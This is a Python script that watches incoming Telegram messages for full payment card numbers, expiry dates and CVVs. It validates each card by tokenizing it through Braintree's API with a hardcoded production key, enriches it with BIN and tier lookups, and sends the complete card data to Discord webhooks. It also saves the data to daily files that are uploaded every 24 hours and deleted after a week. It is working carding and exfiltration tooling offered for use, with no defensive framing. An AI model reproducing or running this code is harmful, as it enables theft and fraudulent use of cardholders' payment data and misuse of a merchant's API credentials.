import os
import requests
import time
import datetime
import threading
from dotenv import load_dotenv
import schedule
from telethon import TelegramClient, events
import re

# Load environment variables from .env file
load_dotenv()

# Retrieve environment variables
webhook_url = os.environ.get("WEBHOOK")  # Discord webhook for credit card data
api_id = os.environ.get("APPID")
api_hash = os.environ.get("APIHASH")
api_name = os.environ.get("APINAME")
new_webhook_url = os.environ.get("NEW_WEBHOOK")  # New Discord webhook for sending text files

# Initialize the Telegram client
client = TelegramClient(api_name, api_id, api_hash)

# Dictionary to store unique credit card data
unique_cc_data = {}

# Function to perform BIN check using Braintree system
def perform_bin_check(cc_number, expiration_month, expiration_year, cvv):
    bin_payload = {
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc_number,
                    'expirationMonth': expiration_month,
                    'expirationYear': expiration_year,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '91710'
                    }
                },
                'options': {
                    'validate': False
                }
            }
        },
        'operationName': 'TokenizeCreditCard'
    }

    headers = {
        'User-Agent': '<UA>',
        'Pragma': 'no-cache',
        'Accept': '*/*',
        'Authorization': 'Bearer production_5rt2dzrx_t4c8brq867ms8kdy',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://assets.braintreegateway.com/',
        'Accept-Language': 'en-US,en;q=0.9,it;q=0.8'
    }

    time.sleep(2)

    response = requests.post('https://payments.braintree-api.com/graphql', json=bin_payload, headers=headers, timeout=20)
    response_json = response.json()
    return response_json
def check_card_level(cc_number):
    url = f'https://data.handyapi.com/bin/{cc_number}'
    headers = {
        'referrer': 'your-domain'
    }

    try:
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code == 200:
            data = response.json()
            card_type = data.get('Type', 'Unknown')
            card_tier = data.get('CardTier', 'Unknown')
            return f'Type: {card_type}, CardTier: {card_tier}'
        else:
            return 'Unknown'
    except Exception as e:
        print(f'Error checking card level: {str(e)}')
        return 'Unknown'

def send_cc_to_discord(cc, expiration_month, expiration_year, cvv, bin, brand, country, bank, debit, prepaid, healthcare):
    cc_full = f'{cc}|{expiration_month}|{expiration_year}|{cvv}'
    
    # Check if the expiration year is in the list [2021, 2022, 2023, 2024]
    if expiration_year in ['21', '22', '23', '24', '2024']:
        print(f"Skipping CC with expiration year {expiration_year}")
        return
    
    cc_masked = f'{cc[:6]}xxxx'
    card_level = check_card_level(bin)  # Check card level using the BIN

    formatted_message = (
        f"CC: {cc_full}\n"
        f"BIN: {bin}\n"
        f"BRAND: {brand}\n"
        f"COUNTRY: {country}\n"
        f"BANK: {bank}\n"
        f"Type: {card_level.split(', ')[0].split(': ')[1]}\n"  # Extract Type from card level
        f"CardTier: {card_level.split(', ')[1].split(': ')[1]}\n"  # Extract CardTier from card level
        f"DEBIT: {debit}\n"
        f"PREPAID: {prepaid}\n"
        f"HEALTHCARE: {healthcare}"
    )

    separator = "\n--------------------------------------------------------\n"
    payload = {
        'content': formatted_message + separator
    }

    response = requests.post(webhook_url, json=payload)
    if response.status_code == 200:
        print('CC details sent to Discord successfully')
    else:
        print('Failed to send CC details to Discord')



# Function to save CC data to a text file with the date of the day
def save_cc_to_file(cc, expiration_month, expiration_year, cvv, bin, brand, country, bank, debit, prepaid, healthcare):
    cc_full = f'{cc}|{expiration_month}|{expiration_year}|{cvv}'
    cc_masked = f'{cc[:6]}xxxx'
    cc_data = f"{cc_full} | {bin} | {brand} | {country} | {bank} | {debit} | {prepaid} | {healthcare}"
    today_date = datetime.datetime.now().strftime("%Y-%m-%d")
    file_name = f"cc_data_{today_date}.txt"
    
    with open(file_name, "a") as cc_file:
        cc_file.write(cc_data + "\n")

# Function to send the text file to Discord
def send_text_file_to_discord():
    today_date = datetime.datetime.now().strftime("%Y-%m-%d")
    file_name = f"cc_data_{today_date}.txt"
    
    if os.path.exists(file_name):
        files = {'file': (file_name, open(file_name, 'rb'))}
        payload = {
            'content': 'Here is the latest credit card data file:'
        }
        response = requests.post(new_webhook_url, data=payload, files=files)
        if response.status_code == 200:
            print(f'Text file ({file_name}) sent to Discord successfully')
        else:
            print(f'Failed to send text file ({file_name}) to Discord')
    else:
        print(f'File not found: {file_name}')

# Function to periodically send the text file every 24 hours
def periodic_text_file_sender(interval_seconds):
    while True:
        send_text_file_to_discord()
        time.sleep(interval_seconds)

# Function to clean up old text files (keep files from the last 7 days)
def cleanup_old_text_files():
    while True:
        files = os.listdir()
        today_date = datetime.datetime.now()
        for file in files:
            if file.startswith("cc_data_") and file.endswith(".txt"):
                file_date_str = file[8:18]
                file_date = datetime.datetime.strptime(file_date_str, "%Y-%m-%d")
                days_difference = (today_date - file_date).days
                if days_difference >= 7:
                    os.remove(file)
                    print(f'Removed old file: {file}')
        time.sleep(3600)

# Create a separate thread for the periodic text file sender (every 24 hours)
interval_seconds = 24 * 60 * 60
text_file_sender_thread = threading.Thread(target=periodic_text_file_sender, args=(interval_seconds,))
text_file_sender_thread.daemon = True
text_file_sender_thread.start()

# Create a separate thread for cleaning up old text files
cleanup_thread = threading.Thread(target=cleanup_old_text_files)
cleanup_thread.daemon = True
cleanup_thread.start()

@client.on(events.NewMessage(incoming=True))
async def handle_message(event):
    message = event.message.message

    cc_pattern = re.compile(r'(\d{12,19})[^\d\n]*(\d{1,2})[^\d\n]*(\d{1,4})[^\d\n]*(\d{3,4})')
    cc_match = cc_pattern.search(message)

    if cc_match:
        cc_number, expiration_month, expiration_year, cvv = [info.strip() for info in cc_match.groups()]

        cc_key = f"{cc_number}|{expiration_month}|{expiration_year}|{cvv}"
        if cc_key not in unique_cc_data and expiration_year != '23':
            bin_response = perform_bin_check(cc_number, expiration_month, expiration_year, cvv)

            bin = bin_response.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('bin', '')
            brand = bin_response.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('brandCode', '')
            country = bin_response.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('binData', {}).get('countryOfIssuance', '')
            bank = bin_response.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('binData', {}).get('issuingBank', '')
            debit = bin_response.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('binData', {}).get('debit', '')
            prepaid = bin_response.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('binData', {}).get('prepaid', '')
            healthcare = bin_response.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('binData', {}).get('healthcare', '')

            send_cc_to_discord(cc_number, expiration_month, expiration_year, cvv, bin, brand, country, bank, debit, prepaid, healthcare)
            save_cc_to_file(cc_number, expiration_month, expiration_year, cvv, bin, brand, country, bank, debit, prepaid, healthcare)
            unique_cc_data[cc_key] = True

client.start()
while True:
    schedule.run_pending()
    client.run_until_disconnected()
